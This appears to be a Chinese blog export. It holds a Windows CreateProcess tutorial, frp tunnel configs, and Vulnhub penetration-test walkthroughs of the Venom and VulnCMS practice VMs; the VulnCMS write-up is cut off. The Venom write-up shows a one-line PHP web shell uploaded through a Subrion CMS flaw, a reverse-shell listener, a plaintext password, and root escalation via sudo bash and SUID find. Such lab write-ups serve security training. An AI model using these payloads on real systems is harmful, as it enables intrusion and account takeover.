用于确定是否可以由子进程继承返回新进程对象的句柄。如果lpProcessAttributes为NULL, 则不能继承句柄; lpThreadAttributes指向SECURITY_ATTRIBUTES结构的指针, 用于确定是否可以由子进程继承返回的新线程对象的句柄。如果lpThreadAttributes为NULL, 则不能继承句柄; bInheritHandles如果此参数为TRUE, 则调用进程中的每个可继承句柄都将由新进程来继承。如果该参数为FALSE, 则不会继承句柄; dwCreationFlags控制优先级和创建进程的标志。例如, CREATE_NEW_CONSOLE表示新进程将使用一个新控制台, 而不是继承父进程的控制台。CREATE_SUSPENDED表示新进程的主线程会以暂停的状态来创建, 直到调用ResumeThread函数时才运行; lpEnvironment指向新进程的环境块的指针。如果此参数为NULL, 则新进程将使用调用进程的环境; lpCurrentDirectory指向进程当前目录的完整路径。该字符串还可以指定UNC路径, 如果此参数为NULL, 则新进程将具有与调用进程相同的当前驱动器和目录; lpStartupInfo指向STARTUPINFO或STARTUPINFOEX结构的指针。STARTUPINFO或STARTUPINFOEX中的句柄在不需要时必须由CloseHandle关闭; lpProcessInformation指向PROCESS_INFOMATION结构的指针。用于接收有关新进程的标识信息。PROCESS_INFOMATION中的句柄必须在不需要时由CloseHandle关闭; 返回值 如果函数成功, 则返回值非零;如果函数失败, 则返回值为零; 代码示例123456789101112STARTUPINFO si = &#123; 0 &#125;;PROCESS_INFOMATION pi = &#123; 0 &#125;;si.cb = sizeof(STARTUPINFO);si.dwFlags = STARTF_USESHOWWINDOW; // 指定wShowWindow成员有效si.wShowWindow = uiCmdShow;BOOL bRet = CreateProcess(NULL, &quot;cmd.exe&quot;, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);if (bRet == FALSE)&#123; CloseHandle(pi.hThread); CloseHanle(pi.hProcess); return;&#125; 使用事项-1CreateProcess着重注意5个参数: 执行模块名称的参数lpApplicationName、执行命令行的参数lpCommandLine、控制进程优先级和创建进程标志的参数dwCreationFlags、指向STARTUPINFO信息结构的参数lpStartupInfo、以及指向PROCESS_INFOMATION信息结构的参数lpProcessInformation; 使用事项-2CreateProcess函数在指定窗口显示方式时, 需要在STARTUPINFO结构体中将启用标志设置成STARTF_USESHOWWINDOW, 表示wShowWindow成员显示方式有效。然后将wShowWindow设置为SW_HIDE隐藏窗口, 创建方式为CREATE_NEW_CONSOLE创建一个新控制台; 创建进程时共享句柄表 在创建进程中创建一个进程（比如WeChat进程）, 并设定该子进程的进程内核句柄与主线程内核句柄为可继承;在A进程中再创建一个进程B, 在进程B中对WeChat进程控制; 代码示例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// 进程A代码// ConsoleApplication1.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;windows.h&gt;int main()&#123; WCHAR wcBuffer[256]&#123;&#125;; WCHAR wcHandle[10]&#123;&#125;; SECURITY_ATTRIBUTES sa_p&#123;&#125;; sa_p.nLength = sizeof(SECURITY_ATTRIBUTES); sa_p.lpSecurityDescriptor = NULL; sa_p.bInheritHandle = TRUE; SECURITY_ATTRIBUTES sa_t&#123;&#125;; sa_t.nLength = sizeof(SECURITY_ATTRIBUTES); sa_t.lpSecurityDescriptor = NULL; sa_t.bInheritHandle = TRUE; STARTUPINFO si = &#123; sizeof(STARTUPINFO) &#125;; PROCESS_INFORMATION pi&#123;&#125;; const char* szCmdLine = &quot;D:\\\\Tencent\\\\WeChat\\\\WeChat.exe&quot;; WCHAR wcCmdLine[256]&#123;&#125;; wsprintf(wcCmdLine, L&quot;%S&quot;, szCmdLine); if (FALSE == CreateProcess(NULL, wcCmdLine, &amp;sa_p, &amp;sa_t, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi)) &#123; printf(&quot;WeChat CreateProcess Failed\\n&quot;); return 0; &#125; wsprintf(wcHandle, L&quot;%x %x&quot;, pi.hProcess, pi.hThread); wsprintf(wcBuffer, L&quot;D:\\\\Visual Studio Projects\\\\DiShui Projects\\\\05_20_Test_Demo\\\\ConsoleApplication1\\\\x64\\\\Debug\\\\ConsoleApplication2.exe %s&quot;, wcHandle); STARTUPINFO si_B = &#123; sizeof(STARTUPINFO) &#125;; PROCESS_INFORMATION pi_B&#123;&#125;; if (FALSE == CreateProcess(NULL, wcBuffer, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si_B, &amp;pi_B)) &#123; printf(&quot;CreateProcess Failed\\n&quot;); return 0; &#125; return 0;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445// 进程B代码// ConsoleApplication2.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;windows.h&gt;int main(int argc, char* argv[])&#123; DWORD dwProcessHandle = -1; DWORD dwThreadHandle = 0; WCHAR wcBuffer[256]&#123;&#125;; printf(&quot;%s %s\\n&quot;, argv[1], argv[2]); // 转换进程句柄 MultiByteToWideChar(CP_ACP, 0, argv[1], -1, wcBuffer, sizeof(wcBuffer) / sizeof(WCHAR)); swscanf(wcBuffer, L&quot;%x&quot;, &amp;dwProcessHandle); printf(&quot;%x\\n&quot;, dwProcessHandle); // 转换线程句柄 memset(wcBuffer, 0, 256); MultiByteToWideChar(CP_ACP, 0, argv[2], -1, wcBuffer, sizeof(wcBuffer) / sizeof(WCHAR)); swscanf(wcBuffer, L&quot;%x&quot;, &amp;dwThreadHandle); printf(&quot;%x\\n&quot;, dwThreadHandle); printf(&quot;获取父进程句柄、主线程句柄\\n&quot;); Sleep(5000); //挂起主线程 printf(&quot;挂起主线程\\n&quot;); SuspendThread((HANDLE)dwThreadHandle); Sleep(5000); // 恢复主线程 printf(&quot;恢复主线程\\n&quot;); ResumeThread((HANDLE)dwThreadHandle); Sleep(5000); // 关闭ID进程 TerminateProcess((HANDLE)dwProcessHandle, 1); WaitForSingleObject((HANDLE)dwProcessHandle, INFINITE); printf(&quot;ID进程已经关闭\\n&quot;); system(&quot;pause&quot;);&#125;","categories":[{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/categories/Windows-API/"}],"tags":[{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/tags/Windows-API/"}]},{"title":"shadowsocket配置","slug":"shadowsocket配置","date":"2023-04-01T07:08:18.000Z","updated":"2024-06-27T08:16:35.470Z","comments":true,"path":"fc41ab04.html","link":"","permalink":"http://example.com/fc41ab04.html","excerpt":"记录一下shadowsocket的配置为了愉快的使用Google","text":"记录一下shadowsocket的配置为了愉快的使用Google 国内[209]配置 国内[209]配置 server配置[common]bind_port &#x3D; 7001client配置[common]server_addr &#x3D; 127.0.0.1server_port &#x3D; 7000[ssh]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 22remote_port &#x3D; 6000 硅谷[184]配置 硅谷[184]配置 新加坡[188]server配置[common]bind_port &#x3D; 7001新加披[188]client配置[common]server_addr &#x3D; 国内[209]server_port &#x3D; 7001[frp_shadow]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 8890remote_port &#x3D; 8889[frp_shh]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 6002remote_port &#x3D; 6667 新加坡[188]配置 新加坡[188]配置 server配置bind_port &#x3D; 7000新加坡[188]client配置[common]server_addr &#x3D; [硅谷]184server_port &#x3D; 7001[frp_client_188]type &#x3D; tcplocal_ip &#x3D; 1270.0.1local_port &#x3D; 22remote_port &#x3D; 6002[shadowrocket_client_188]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 8388remote_port &#x3D; 8890","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"vulnhub-Venom","slug":"vulnhub-Venom","date":"2021-07-31T14:35:00.000Z","updated":"2023-03-25T14:35:06.470Z","comments":true,"path":"64974.html","link":"","permalink":"http://example.com/64974.html","excerpt":"","text":"记录打靶机（Venom）过程参考： https://nepcodex.com/2021/06/venom-walkthrough-vulnhub-writeup/ https://grumpygeekwrites.wordpress.com/2021/06/20/vulnhub-venom-walk-through-tutorial-writeup/ 主机发现使用arp-scan进行存活IP探测 1234567891011sudo arp-scan 192.168.109.0/24[sudo] password for kali: Interface: eth0, type: EN10MB, MAC: 00:0c:29:d6:59:a7, IPv4: 192.168.109.140Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)192.168.109.2 00:50:56:f0:a1:15 VMware, Inc.192.168.109.1 00:50:56:c0:00:08 VMware, Inc.192.168.109.147 00:0c:29:90:08:c7 VMware, Inc.192.168.109.254 00:50:56:f8:89:68 VMware, Inc.4 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.7: 256 hosts scanned in 1.930 seconds (132.64 hosts/sec). 4 responded 经探测可知目标IP为192.168.109.147，接下来对此IP进行端口扫描，尝试获取更多信息 端口扫描1234567891011121314151617181920212223242526272829303132333435363738394041nmap -sC -sV -p- 192.168.109.147 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-28 09:08 EDTNmap scan report for 192.168.109.147Host is up (0.00032s latency).Not shown: 65530 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.380/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)443/tcp open ssl/https Apache/2.4.29 (Ubuntu)|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)Service Info: Host: VENOM; OS: UnixHost script results:|_clock-skew: mean: 6h09m59s, deviation: 3h10m31s, median: 7h59m58s|_nbstat: NetBIOS name: VENOM, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu)| Computer name: venom| NetBIOS computer name: VENOM\\x00| Domain name: \\x00| FQDN: venom|_ System time: 2021-07-29T02:38:46+05:30| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2021-07-28T21:08:46|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 24.02 seconds 经扫描可知目标开放了21（ftp）、80（http）、139（smb）、443（https）、445（smb）等多个端口。 整理一下思路针对不同端口： ftp（21）端口： 尝试匿名用户登录 打岔 ✘ * 漏洞数据库搜索相关版本漏洞，此处版本过高暂没有利用漏洞 打岔 ✘ http（80）端口： 读取源码，尝试获取敏感信息 ✔（此处在做的过程中没有仔细查看，漏掉重要突破口） smb（139、445）端口： 可以尝试使用MSF中ms 07-010进行漏洞探测 ✗ * 枚举SMB服务 ✔ https（443）端口 此端口暂没有什么思路 以上思路经过验证并参考大神思路后得知突破口在http（80）端口 目录扫描12345678910111213141516171819202122dirb http://192.168.109.147:80/ -----------------DIRB v2.22 By The Dark Raver-----------------START_TIME: Sat Jul 31 11:10:45 2021URL_BASE: http://192.168.109.147:80/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.109.147:80/ ----+ http://192.168.109.147:80/index.html (CODE:200|SIZE:11004) + http://192.168.109.147:80/server-status (CODE:403|SIZE:280) -----------------END_TIME: Sat Jul 31 11:10:48 2021DOWNLOADED: 4612 - FOUND: 2 经扫描index.html返回200，此页面是Ubuntu LogoApache2 Ubuntu Default Page，所以当时没想到查看源码，淦。在源码结尾藏有一段MD5加密的字符串： 解码经解密后得到hostinger,参考网上思路后得知需要枚举SMB服务，小笔记记下，因为对445端口做信息收集还是第一次 枚举SMB服务参考网上使用enum4linux进行枚举 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157enum4linux -a 192.168.109.147Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul 28 09:18:59 2021 ========================== | Target Information | ========================== Target ........... 192.168.109.147RID Range ........ 500-550,1000-1050Username ......... &#x27;&#x27;Password ......... &#x27;&#x27;Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ======================================================= | Enumerating Workgroup/Domain on 192.168.109.147 | ======================================================= [+] Got domain/workgroup name: WORKGROUP =============================================== | Nbtstat Information for 192.168.109.147 | =============================================== Looking up status of 192.168.109.147 VENOM &lt;00&gt; - B &lt;ACTIVE&gt; Workstation Service VENOM &lt;03&gt; - B &lt;ACTIVE&gt; Messenger Service VENOM &lt;20&gt; - B &lt;ACTIVE&gt; File Server Service ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Master Browser WORKGROUP &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Domain/Workgroup Name WORKGROUP &lt;1d&gt; - B &lt;ACTIVE&gt; Master Browser WORKGROUP &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Browser Service Elections MAC Address = 00-00-00-00-00-00 ======================================== | Session Check on 192.168.109.147 | ======================================== [+] Server 192.168.109.147 allows sessions using username &#x27;&#x27;, password &#x27;&#x27; ============================================== | Getting domain SID for 192.168.109.147 | ============================================== Domain Name: WORKGROUPDomain Sid: (NULL SID)[+] Can&#x27;t determine if host is part of domain or part of a workgroup ========================================= | OS information on 192.168.109.147 | ========================================= Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.[+] Got OS info for 192.168.109.147 from smbclient: [+] Got OS info for 192.168.109.147 from srvinfo: VENOM Wk Sv PrQ Unx NT SNT venom server (Samba, Ubuntu) platform_id : 500 os version : 6.1 server type : 0x809a03 ================================ | Users on 192.168.109.147 | ================================ Use of uninitialized value $users in print at ./enum4linux.pl line 874.Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.Use of uninitialized value $users in print at ./enum4linux.pl line 888.Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890. ============================================ | Share Enumeration on 192.168.109.147 | ============================================ Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers IPC$ IPC IPC Service (venom server (Samba, Ubuntu))SMB1 disabled -- no workgroup available[+] Attempting to map shares on 192.168.109.147//192.168.109.147/print$ Mapping: DENIED, Listing: N/A//192.168.109.147/IPC$ [E] Can&#x27;t understand response:NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\* ======================================================= | Password Policy Information for 192.168.109.147 | ======================================================= [+] Attaching to 192.168.109.147 using a NULL share[+] Trying protocol 139/SMB...[+] Found domain(s): [+] VENOM [+] Builtin[+] Password Info for Domain: VENOM [+] Minimum password length: 5 [+] Password history length: None [+] Maximum password age: 37 days 6 hours 21 minutes [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: None [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: 37 days 6 hours 21 minutes [+] Retieved partial password policy with rpcclient:Password Complexity: DisabledMinimum Password Length: 5 ================================= | Groups on 192.168.109.147 | ================================= [+] Getting builtin groups:[+] Getting builtin group memberships:[+] Getting local groups:[+] Getting local group memberships:[+] Getting domain groups:[+] Getting domain group memberships: ========================================================================== | Users on 192.168.109.147 via RID cycling (RIDS: 500-550,1000-1050) | ========================================================================== [I] Found new SID: S-1-22-1[I] Found new SID: S-1-5-21-3525385883-4254613925-43684688[I] Found new SID: S-1-5-32[+] Enumerating users using SID S-1-5-21-3525385883-4254613925-43684688 and logon username &#x27;&#x27;, password &#x27;&#x27;...skip...[+] Enumerating users using SID S-1-22-1 and logon username &#x27;&#x27;, password &#x27;&#x27;S-1-22-1-1000 Unix User\\nathan (Local User)S-1-22-1-1002 Unix User\\hostinger (Local User) ================================================ | Getting printer info for 192.168.109.147 | ================================================ No printers returned.enum4linux complete on Wed Jul 28 09:19:14 2021 经过枚举可以发现hostinger是使用者之一，结合之前解密的MD5值进行ftp登录 ftp登录123456789101112131415161718192021222324252627ftp 192.168.109.147Connected to 192.168.109.147.220 (vsFTPd 3.0.3)Name (192.168.109.147:kali): hostinger331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x 2 1002 1002 4096 May 21 23:43 files226 Directory send OK.ftp&gt; cd files250 Directory successfully changed.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r-- 1 0 0 384 May 21 23:43 hint.txt226 Directory send OK.ftp&gt; get hint.txtlocal: hint.txt remote: hint.txt200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for hint.txt (384 bytes).226 Transfer complete.384 bytes received in 0.04 secs (10.3970 kB/s) 可以登录成功，可以发现files目录下存在hint.txt，下载下来查看内容 123456789101112 Hey there... T0D0 --* You need to follow the &#x27;hostinger&#x27; on WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0= also aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=* some knowledge of cipher is required to decode the dora password..* try on venom.boxpassword -- L7f9l8@J#p%Ue+Q1234 -&gt; deocode this you will get the administrator password Have fun .. :) 在hint.txt中存在两段base64编码的字符串 Base64 解码12345echo &#x27;WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0=&#x27; | base64 -d | base64 -d | base64 -dstandard vigenere cipher ┌──(kali㉿kali)-[~/Desktop]└─$ echo &#x27;aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=&#x27; | base64 -d https://cryptii.com/pipes/vigenere-cipher 第一段需要解码4次，第二段解码为一个网址 整理信息： 解码bash64得到相关信息 盒子主机名为venom.box1You need to follow the &#x27;hostinger&#x27; on standard vigenere cipher also https://cryptii.com/pipes/vigenere-cipher 添加主机名到主机文件中，访问域名可得到新的页面，此处参考另一种思路，在https://cryptii.com/pipes/vigenere-cipher可以解密得到dora的密码 登录venom.box此处可以看到版本信息为Subrion CMS 4.2.1在exploit-db中搜索可以得到该版本存在一个文件上传漏洞 漏洞利用通过构造一句话木马上传后以获得shell，根据提示可以得知因为该版本中.htaccess文件中忽略了 .pht、 .phar文件后缀的文件 12cat php-shell.phar &lt;?php system($_GET[cmd]); ?&gt; 成功执行命令 获取shell通过前面上传的一句话木马执行python反向连接shell此时需要监听4444 端口 123456nc -lvp 4444 1 ⨯listening on [any] 4444 ...connect to [192.168.109.140] from venom.box [192.168.109.147] 33098$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data) 成功获取shell此时是在upload目录的切换到home目录下查看存在用户 123456789cd /homecd /home$ ls -lartls -larttotal 16drwxr-xr-x 24 root root 4096 May 20 10:08 ..drwxr-xr-x 4 root root 4096 May 21 17:00 .drwxr-x--- 17 nathan nathan 4096 May 22 00:21 nathandrwxr-xr-x 16 hostinger hostinger 4096 May 22 13:58 hostinger 使用hostinger/hostinger登录，登录成功后在/var/www/html/subrion/backup下.htaccess文件中存在nathan密码 切换nathan用户，可获取第一个flag 12345678910111213141516su nathansu nathanPassword: FzN+f2-rRaBgvALzj*Rk#_JJYfg8XfKhxqB82x_anathan@venom:/var/www/html/subrion/backup$ ididuid=1000(nathan) gid=1000(nathan) groups=1000(nathan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)nathan@venom:/var/www/html/subrion/backup$ cd cd nathan@venom:~$ lslsDesktop Downloads Music Public user.txtDocuments examples.desktop Pictures Templates Videosnathan@venom:~$ cat user.txtcat user.txtW3_@r3_V3n0m:P 权限提升尝试sudo提权 123456789sudo -l sudo -l Matching Defaults entries for nathan on venom: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser nathan may run the following commands on venom: (root) ALL, !/bin/su (root) ALL, !/bin/su 参考得知这里直接运行sudo bash即可提权 1234567891011121314sudo -l sudo -l Matching Defaults entries for nathan on venom: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser nathan may run the following commands on venom: (root) ALL, !/bin/su (root) ALL, !/bin/sunathan@venom:~$ sudo bashsudo bashroot@venom:~# ididuid=0(root) gid=0(root) groups=0(root) 第二种方式通过查找设置了SUID位的文件find / -perm -4000 -exec ls -al &#123;&#125; \\; 2&gt;/dev/null 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051nathan@venom:~$ find / -perm -4000 -exec ls -al &#123;&#125; \\; 2&gt;/dev/nullfind / -perm -4000 -exec ls -al &#123;&#125; \\; 2&gt;/dev/null-rwsr-xr-x 1 root root 1473576 Apr 20 10:15 /opt/VBoxGuestAdditions-6.1.20/bin/VBoxDRMClient-rwsr-s--- 1 root nathan 238080 Nov 5 2017 /usr/bin/find-rwsr-xr-x 1 root root 22520 Mar 27 2019 /usr/bin/pkexec-rwsr-xr-x 1 root root 44528 Mar 23 2019 /usr/bin/chsh-rwsr-xr-x 1 root root 59640 Mar 23 2019 /usr/bin/passwd-rwsr-xr-x 1 root root 22528 Jun 28 2019 /usr/bin/arping-rwsr-xr-x 1 root root 75824 Mar 23 2019 /usr/bin/gpasswd-rwsr-xr-x 1 root root 18448 Jun 28 2019 /usr/bin/traceroute6.iputils-rwsr-xr-x 1 root root 40344 Mar 23 2019 /usr/bin/newgrp-rwsr-xr-x 1 root root 76496 Mar 23 2019 /usr/bin/chfn-rwsr-xr-x 1 root root 149080 Jan 31 2020 /usr/bin/sudo-rwsr-xr-x 1 root root 10232 Mar 28 2017 /usr/lib/eject/dmcrypt-get-device-rwsr-xr-x 1 root root 436552 Mar 4 2019 /usr/lib/openssh/ssh-keysign-rwsr-xr-- 1 root messagebus 42992 Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 14328 Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1-rwsr-sr-x 1 root root 10232 Jul 3 2020 /usr/lib/xorg/Xorg.wrap-rwsr-xr-x 1 root root 113528 Jul 10 2020 /usr/lib/snapd/snap-confine-rwsr-xr-- 1 root dip 378600 Jul 23 2020 /usr/sbin/pppd-rwsr-xr-x 1 root root 43088 Mar 5 2020 /bin/mount-rwsr-xr-x 1 root root 26696 Mar 5 2020 /bin/umount-rwsr-xr-x 1 root root 44664 Mar 23 2019 /bin/su-rwsr-xr-x 1 root root 30800 Aug 11 2016 /bin/fusermount-rwsr-xr-x 1 root root 64424 Jun 28 2019 /bin/ping-rwsr-xr-x 1 root root 43088 Sep 17 2020 /snap/core18/2066/bin/mount-rwsr-xr-x 1 root root 64424 Jun 28 2019 /snap/core18/2066/bin/ping-rwsr-xr-x 1 root root 44664 Mar 23 2019 /snap/core18/2066/bin/su-rwsr-xr-x 1 root root 26696 Sep 17 2020 /snap/core18/2066/bin/umount-rwsr-xr-x 1 root root 76496 Mar 23 2019 /snap/core18/2066/usr/bin/chfn-rwsr-xr-x 1 root root 44528 Mar 23 2019 /snap/core18/2066/usr/bin/chsh-rwsr-xr-x 1 root root 75824 Mar 23 2019 /snap/core18/2066/usr/bin/gpasswd-rwsr-xr-x 1 root root 40344 Mar 23 2019 /snap/core18/2066/usr/bin/newgrp-rwsr-xr-x 1 root root 59640 Mar 23 2019 /snap/core18/2066/usr/bin/passwd-rwsr-xr-x 1 root root 149080 Jan 19 2021 /snap/core18/2066/usr/bin/sudo-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11 2020 /snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 436552 Mar 4 2019 /snap/core18/2066/usr/lib/openssh/ssh-keysign-rwsr-xr-x 1 root root 43088 Mar 5 2020 /snap/core18/1885/bin/mount-rwsr-xr-x 1 root root 64424 Jun 28 2019 /snap/core18/1885/bin/ping-rwsr-xr-x 1 root root 44664 Mar 23 2019 /snap/core18/1885/bin/su-rwsr-xr-x 1 root root 26696 Mar 5 2020 /snap/core18/1885/bin/umount-rwsr-xr-x 1 root root 76496 Mar 23 2019 /snap/core18/1885/usr/bin/chfn-rwsr-xr-x 1 root root 44528 Mar 23 2019 /snap/core18/1885/usr/bin/chsh-rwsr-xr-x 1 root root 75824 Mar 23 2019 /snap/core18/1885/usr/bin/gpasswd-rwsr-xr-x 1 root root 40344 Mar 23 2019 /snap/core18/1885/usr/bin/newgrp-rwsr-xr-x 1 root root 59640 Mar 23 2019 /snap/core18/1885/usr/bin/passwd-rwsr-xr-x 1 root root 149080 Jan 31 2020 /snap/core18/1885/usr/bin/sudo-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11 2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 436552 Mar 4 2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign-rwsr-xr-x 1 root root 110792 Jul 11 2020 /snap/snapd/8542/usr/lib/snapd/snap-confine-rwsr-xr-x 1 root root 111080 Apr 24 17:35 /snap/snapd/11841/usr/lib/snapd/snap-confine 这里参考网上思路，使用find进行提权并读取第二个flag 1234567891011121314151617$ pwdpwd/home/nathan$ /usr/bin/find . -exec /bin/sh -p \\; -quit /usr/bin/find . -exec /bin/sh -p \\; -quit# ididuid=1000(nathan) gid=1000(nathan) euid=0(root) groups=1000(nathan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)# cd /root/cd /root/# lslsroot.txt snap# cat root.txtcat root.txt#root_flagH@v3_a_n1c3_l1fe. done 总结 不够细心 没有清晰的渗透步骤，脑子太乱 坚持","categories":[],"tags":[],"author":"Dokey_"},{"title":"vulnhub-VulnCMS","slug":"vulnhub-VulnCMS","date":"2021-07-27T16:42:27.000Z","updated":"2023-03-25T14:35:06.479Z","comments":true,"path":"10746.html","link":"","permalink":"http://example.com/10746.html","excerpt":"","text":"记录打靶机（VulnCMS）过程信息探测主机发现使用arp-scan进行主机IP发现，探测网段中目标主机IP地址。 1234567891011sudo arp-scan 192.168.109.0/24[sudo] password for kali: Interface: eth0, type: EN10MB, MAC: 00:0c:29:d6:59:a7, IPv4: 192.168.109.140Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)192.168.109.1 00:50:56:c0:00:08 VMware, Inc.192.168.109.2 00:50:56:f0:a1:15 VMware, Inc.192.168.109.145 00:0c:29:da:98:92 VMware, Inc.192.168.109.254 00:50:56:f8:89:68 VMware, Inc.4 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.7: 256 hosts scanned in 1.938 seconds (132.09 hosts/sec). 4 responded 经探测发现目标IP地址为192.168.109.145，接着使用nmap对该IP地址进行端口扫描 端口扫描 123456789101112131415161718192021222324252627282930313233343536sudo nmap -sC -sV -p- 192.168.109.145[sudo] password for kali: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-27 12:43 EDTNmap scan report for 192.168.109.145Host is up (0.0014s latency).Not shown: 65530 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 8c:9f:7e:78:82:ef:76:f6:26:23:c9:52:6d:aa:fe:d0 (RSA)| 256 2a:e2:f6:d2:52:1c:c1:d0:3d:aa:40:e6:b5:08:1d:45 (ECDSA)|_ 256 fa:c9:eb:58:e3:d2:b7:4a:74:77:fc:69:0e:b6:68:08 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: W3.CSS Template5000/tcp open http nginx 1.14.0 (Ubuntu)|_http-generator: WordPress 5.7.2|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: fsociety &amp;#8211; Just another WordPress site8081/tcp open http nginx 1.14.0 (Ubuntu)|_http-generator: Joomla! - Open Source Content Management| http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: Home9001/tcp open http nginx 1.14.0 (Ubuntu)|_http-generator: Drupal 7 (http://drupal.org)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: fsociety.webMAC Address: 00:0C:29:DA:98:92 (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.84 seconds 经nmap扫描后发现存在22（ssh）、80（http）、5000（http）、8081（http）、9001（http）因为此靶机除了22（ssh）端口以外其他都是http服务相关的，在漏洞数据库搜索了openssh 